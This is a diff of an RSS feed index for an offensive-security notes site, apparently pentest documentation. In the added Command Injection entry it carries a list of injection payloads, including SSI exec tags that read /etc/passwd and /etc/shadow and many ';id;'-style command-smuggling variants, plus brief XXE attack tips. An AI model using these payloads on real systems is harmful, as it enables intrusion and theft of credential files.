@@ -270,8 +270,8 @@ exec - Returns last line of commands output passthru - Passes commands output di
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/commandinjection/</guid>
-      <description> Command Injection # OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
-https://github.com/payloadbox/command-injection-payload-list </description>
+      <description>Command Injection # OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server.
+https://github.com/payloadbox/command-injection-payload-list &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/passwd&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/bin/cat%20/etc/shadow&amp;amp;quot;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/usr/bin/id;--&amp;amp;gt; &amp;amp;lt;!--#exec%20cmd=&amp;amp;quot;/usr/bin/id;--&amp;amp;gt; /index.html|id| ;id; ;id ;netstat -a; ;system(&amp;#39;cat%20/etc/passwd&amp;#39;) ;id; |id |/usr/bin/id |id| |/usr/bin/id| ||/usr/bin/id| |id; ||/usr/bin/id; ;id| ;|/usr/bin/id| \n/bin/ls -al\n \n/usr/bin/id\n \nid\n \n/usr/bin/id; \nid; \n/usr/bin/id| \nid| ;/usr/bin/id\n ;id\n |usr/bin/id\n |nid\n `id` `/usr/bin/id` a);id a;id a);id; a;id; a);id| a;id| a)|id a|id a)|id; a|id |/bin/ls -al a);/usr/bin/id a;/usr/bin/id a);/usr/bin/id; a;/usr/bin/id; a);/usr/bin/id| a;/usr/bin/id| a)|/usr/bin/id a|/usr/bin/id a)|/usr/bin/id; a|/usr/bin/id ;system(&amp;#39;cat%20/etc/passwd&amp;#39;) ;system(&amp;#39;id&amp;#39;) ;system(&amp;#39;/usr/bin/id&amp;#39;) %0Acat%20/etc/passwd %0A/usr/bin/id %0Aid %0A/usr/bin/id%0A %0Aid%0A &amp;amp; ping -i 30 127.</description>
     </item>
     
     <item>
@@ -496,6 +496,15 @@ How to bypass wafs
     
     <item>
       <title></title>
+      <link>https://caon.io/docs/exploitation/workflows/payment/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/workflows/payment/</guid>
+      <description> Payment Workflow # </description>
+    </item>
+    
+    <item>
+      <title></title>
       <link>https://caon.io/docs/exploitation/xss/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
@@ -515,24 +524,6 @@ Javascript files must be beautified, otherwise semgrep will no work properly.</d
       <guid>https://caon.io/docs/exploitation/xxe/</guid>
       <description>XXE # Detection:
 # Content type &amp;#34;application/json&amp;#34; or &amp;#34;application/x-www-form-urlencoded&amp;#34; to &amp;#34;applcation/xml&amp;#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/docs/mindmaps/cookiebasedattacks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/docs/mindmaps/cookiebasedattacks/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>https://caon.io/docs/mindmaps/signup/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://caon.io/docs/mindmaps/signup/</guid>
-      <description></description>
     </item>
     
     <item>
